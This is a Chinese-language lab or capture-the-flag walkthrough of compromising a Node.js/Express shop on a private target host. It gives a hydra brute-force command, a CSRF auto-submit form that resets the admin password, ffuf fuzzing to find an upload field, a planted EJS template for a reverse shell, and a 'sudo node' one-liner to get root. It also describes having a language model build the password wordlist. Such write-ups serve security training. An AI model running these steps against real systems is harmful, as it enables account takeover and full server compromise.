**环境**：靶机 10.10.1.96（渝信优选 商城 v1.2），攻击机 Kali 10.10.1.186。

### **<span style="color:#3498db">信息收集</span>**

nmap 开着 22 和 443/80；ffuf 扫目录拿到一批路由：`/Admin`、`/cart`、`/login`、`/search`、`/uploads` 等：

![mm](/assets/img/2025-07-05-18-39-30.png)
![mm](/assets/img/2025-07-05-18-42-44.png)

常规套路（SQL 注入、文件包含）先试了一轮没戏。期间还踩了个小知识：**URL 里 `#` 后面的内容不会被发给后端**（浏览器层面就截了），想在参数里玩花样不能放 `#` 后面。

### **<span style="color:#3498db">爆破登录</span>**

商品评论里能看到用户名，把站点上能看到的姓名、部门等线索丢给大模型生成字典，然后 hydra 怼登录接口（`F=error` 表示响应里出现 error 就是失败）：

```bash
hydra -L user.txt -P passwd.txt 10.10.1.96/login http-post-form \
  "/login:username=^USER^&password=^PASS^:F=error" -t 10
```

http 先跑没结果，**换成 https 跑就出了**（有些站点 http 只是重定向，登录逻辑在 https 上）：

![mm](/assets/img/2025-07-06-10-05-05.png)

拿普通用户口令登录。

### **<span style="color:#3498db">CSRF：没有防护的资料修改</span>**

登录后摸到资料页，能改邮箱、改密码。观察请求发现**后端完全没有 CSRF 防护**——

**CSRF（跨站请求伪造）的本质**：浏览器发请求会自动带上本站的 Cookie，后端只认"登录状态"、不认"请求是谁发起的"。只要诱导已登录用户访问一个恶意页面，就能以他的身份发请求。

这站更是连诱导都省了，直接三个问题凑齐：

1. **改邮箱：无 Token**，随便伪造；
2. **改密码：Token 校验可绕过**——POST 改 GET 就跳过校验；
3. **Token 未绑定会话**：从我自己的页面拿到的 `_csrf` 值，**拿去改管理员的密码也能用**。

于是做一个自动提交的表单页：`action` 指向改密码接口、塞上自己的 token、把新密码设成想要的：

```html
<form action="https://10.10.1.96/profile/password" method="POST" id="csrfForm">
  <input type="hidden" name="_csrf" value="<我自己的token>">
  <input type="hidden" name="new_password" value="Admin@123456">
  <input type="hidden" name="confirm_password" value="Admin@123456">
</form>
<script>document.getElementById('csrfForm').submit();</script>
```

![mm](/assets/img/2025-07-06-10-49-54.png)

（真实场景里这个页面要钓管理员点开；这里 token 不绑会话，自己点也行。实际拿到后台靠的是接口本身没做好绑定。）

用新密码登录，管理员到手：

![mm](/assets/img/2025-07-06-13-50-10.png)

### **<span style="color:#3498db">找上传点：ffuf 爆破参数名</span>**

后台没有什么注入点，换思路：**上传图片这类大文件基本只能 POST**，用 ffuf 以 POST 方式爆破"文件字段名"（`-F "FUZZ=@test.txt"`，ffuf 会自动处理 multipart 格式）：

```bash
ffuf -w burp-parameter-names.txt:FUZZ -u https://10.10.1.96/admin/upload \
  -b "connect.sid=xxx" -X POST -F "FUZZ=@test.txt;filename=test.txt" -k -t 8 -fc 500
```

爆出文件字段是 **`image`**，接着再爆出一个能指定保存目录的参数 **`target_dir`**：

![mm](/assets/img/2025-07-07-14-03-31.png)

### **<span style="color:#3498db">EJS 模板注入拿 shell</span>**

站点是 **Node.js / Express**（响应头 `X-Powered-By: Express`），两个关键点：

1. 没有 PHP 解析器，传 `.php` 上去只会被下载源码，没用；
2. Express 用 **EJS 模板渲染页面**——`views/` 目录里的 `.ejs` 文件**会被后端加载并执行其中的 JS 代码**。

所以上传一个内容是反弹 shell 代码的 `.ejs` 到 `views/` 目录，再访问对应页面触发渲染：

```bash
ffuf -w 参数名.txt:FUZZ -u https://10.10.1.96/admin/upload -b "connect.sid=xxx" \
  -X POST -d "target_dir=views/" -F "FUZZ=@shell.ejs;filename=shell.ejs" -k -t 8
```

![mm](/assets/img/2025-07-07-14-54-01.png)

触发后拿到 shell。

### **<span style="color:#3498db">sudo node 提权</span>**

`sudo -l` 一看：`node` 免密。node 能直接调系统接口，等于 root：

```bash
sudo node -e 'const c=require("child_process");c.spawnSync("/bin/bash",[],{stdio:[0,1,2]})'
```

![mm](/assets/img/2025-07-07-15-20-21.png)

root 到手。**免密 sudo 解释器（node/python/perl）和 SUID 解释器是一个性质：解释器能执行任意代码，给它就等于给了整个 root。**
